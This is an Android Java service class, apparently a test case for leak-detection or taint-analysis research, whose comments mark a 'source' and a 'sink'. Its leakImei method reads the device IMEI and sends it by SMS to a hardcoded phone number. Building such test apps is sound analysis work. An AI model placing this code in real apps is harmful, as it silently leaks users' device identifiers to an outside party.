package com.imeileakRef;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Binder;
import android.os.IBinder;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.widget.Toast;


/**
 * Created by dewan on 1/27/18.
 * Modified by Shiva on 2/1/18
 */

public class ServClass extends Service {

    IBinder mBinder = new LocalBinder();

    @Override
    public IBinder onBind(Intent intent) {
        return mBinder;
    }

    public class LocalBinder extends Binder {
        public ServClass getServerInstance() {
            return ServClass.this;
        }
    }
    public String getImei()
    {
        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        String imei = telephonyManager.getDeviceId(); //source
        return imei;
    }
    public void leakImei(String imei)
    {
        Toast.makeText(this, imei, Toast.LENGTH_LONG).show();
        SmsManager sms = SmsManager.getDefault();
        sms.sendTextMessage("4193784172", null, imei, null, null);  //sink, leak
    }


}